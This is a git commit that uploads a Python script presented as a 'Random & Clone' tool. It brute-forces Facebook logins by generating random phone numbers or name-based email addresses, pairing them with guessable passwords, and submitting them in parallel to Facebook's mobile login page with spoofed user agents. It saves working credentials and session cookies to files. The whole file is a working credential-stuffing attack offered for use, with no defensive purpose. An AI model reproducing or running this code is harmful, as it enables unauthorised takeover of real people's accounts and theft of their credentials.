a5f4d5552310ed0352e5884d6a25982c2493378e
farhanmallik51 <164368504+farhanmallik51@users.noreply.github.com>
2024-03-29 18:08:06 +0600

    Add files via upload

---
+++ fuck.py
@@ -0,0 +1,267 @@
+#Create By: MUMIT ISLAM HIMU
+#Decode By: Tahosin
+#FaceBook: Mumit Islam
+#GitHub: https://github.com/MUMIT-404-𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠
+#---------------------------------------------------------------------------#
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='NokiaN8-00/012.002;'
+    e='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+os.system('xdg-open https://www.facebook.com/profile.php?id=100006128411641/')
+logo = ("""
+
+    \033[1;31m             ▂▉▉▉▉▂
+       \033[1;32m         ╰▏ ┛┗ ▕╯
+   \033[1;33m              ╲ 👅 ╱
+       \033[1;34m          ╱▔╲╱▔╲
+    \033[1;35m           ╱ ╱▏╭╮▕╲ ╲
+\033[1;36m               ╲ ╲▏╭╮▕╱ ╱      
+        \033[1;32m         ╲▉▉▉▉╱       
+            \033[1;32m      ▏╭╮▕         
+        \033[1;37m          ▏▏▕▕
+           \033[1;33m       ▏▏▕▕
+      \033[1;36m           ╭╰ ╮╭╰ ╮
+   \033[1;34m     Adnan_Always_On_Fire
+●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+
+
+\033[1;37m █████╗ ██████╗ ███╗   ██╗ █████╗ ███╗   ██╗    ██╗  ██╗██╗███╗   ██╗ ██████╗     
+\033[1;36m██╔══██╗██╔══██╗████╗  ██║██╔══██╗████╗  ██║    ██║ ██╔╝██║████╗  ██║██╔════╝     
+\033[1;35m███████║██║  ██║██╔██╗ ██║███████║██╔██╗ ██║    █████╔╝ ██║██╔██╗ ██║██║  ███╗    
+\033[1;33m██╔══██║██║  ██║██║╚██╗██║██╔══██║██║╚██╗██║    ██╔═██╗ ██║██║╚██╗██║██║   ██║    
+\033[1;31m██║  ██║██████╔╝██║ ╚████║██║  ██║██║ ╚████║    ██║  ██╗██║██║ ╚████║╚██████╔╝    
+\033[1;32m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃ [✓] AUTHOR    \033[1;91m: \033[1;92m𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝
+ ┃ [✓] TOOL      \033[1;91m: \033[1;92m𝐑𝐚𝐧𝐝𝐨𝐦 & 𝐂𝐥𝐨𝐧𝐞           
+ ┃ [✓] STATUS    \033[1;91m: \033[1;92m𝐅𝐫𝐞𝐞 𝐈𝐝 𝐅𝐨𝐥𝐥𝐨𝐰𝐞        
+ ┃ [✓] SYSTEM    \033[1;91m: \033[1;92m𝐃𝐚𝐭𝐚 & 𝐖𝐢𝐟𝐢             
+ ┃ [✓] GITHUB    \033[1;91m: \033[1;92mAdnan7878
+ ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92 𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
+
+class Main:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+        print(" [01] Random Number Clone")
+        print(" [02] Random Email Clone ")
+        print(" [00] Exit")
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        Mumit =input(" [?] Choose : ")
+        #os.system('xdg-open https://www.facebook.com/profile.php?id=100006128411641/')
+        if Mumit in ["1", "01"]:
+            num()
+        if Mumit in ["2","02"]:
+            gml()
+        if Mumit in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+def num():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    kode = input(' [?] Enter sim code: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input(' [?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] Process has been started')
+        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] Use flight mode for speed up ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
+
+def gml():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [?] Target fast name : ')
+    os.system('clear')
+    print(logo)
+    kodex = input(' [?] Target last name :  ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    doamin = input(' [?] Terget doamin : ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input('[?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] Process has been started')
+        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] Use flight mode for speed up ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
+def rcrack1(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[\033[1;92m𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-XD\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+           "scheme": 'https',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-US,en;q=0.9',
+           'dpr': '2',
+           'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfdvP2YrSRnCZZTAW-y2A5wsTSsuVyIJVL1bUfXqg06zePXAEsTSxdGpjQxdAhDBIJSvUI1Ezc6vtT2EsNyFh7T9yEbBwsAwK1TNExNiZrwy9w&smuh=23437&lh=Ac8KF0_9PJn5VswCJmU&wtsid=rdr_17NNP7oJPOLZyLSkw&_rdr',
+           'sec-ch-prefers-color-scheme': 'dark',
+           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-model': '"220333QAG"',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-ch-ua-platform-version': '"13.0.0"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+           'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[38;5;46m[𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-OK] {uid} | {ps}")
+                print(f" Cookie : {coki}")
+                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                #print(f"\x1b[31;5;196m[𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CP] {cid} | {ps}")
+                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        #sys.stdout.write(f'\r\033[m[𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        #sys.stdout.flush()
+    except:
+        pass
+Main()
